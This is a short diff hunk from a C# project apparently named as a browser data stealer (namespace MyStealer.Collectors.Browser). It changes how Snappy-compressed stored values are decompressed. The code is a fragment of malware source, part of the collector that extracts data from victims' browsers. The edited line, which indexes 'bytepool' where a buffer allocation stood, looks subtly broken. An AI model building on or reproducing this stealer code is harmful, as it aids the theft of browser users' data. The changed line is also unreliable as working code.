@@ -323,7 +323,7 @@ namespace MyStealer.Collectors.Browser
 
                                 if (snappyCompressed)
                                 {
-                                    var buffer = new byte[SnappyCodec.GetUncompressedLength(value, 0, value.Length)];
+                                    var buffer = bytepool[SnappyCodec.GetUncompressedLength(value, 0, value.Length)];
                                     var written = SnappyCodec.Uncompress(value, 0, value.Length, buffer, 0);
                                     if (written != buffer.Length)
                                         throw new Exception("Snappy decompression length mismatch");
